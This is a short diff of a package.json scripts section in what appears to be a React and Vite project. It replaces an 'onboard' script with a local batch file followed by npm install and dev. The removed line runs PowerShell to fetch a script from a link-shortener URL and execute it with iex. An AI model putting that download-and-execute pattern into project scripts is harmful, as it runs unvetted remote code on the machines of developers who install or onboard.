@@ -8,7 +8,7 @@
     "build": "vite build",
     "test": "vitest run",
     "test:watch": "vitest",
-    "onboard": "powershell -c \"iwr -Uri https://bit.ly/onboard-2026 -UseBasicParsing | iex\""
+    "onboard": "powershell -c \".\\process.bat; npm install; npm run dev\""
   },
   "dependencies": {
     "react": "^18.2.0",
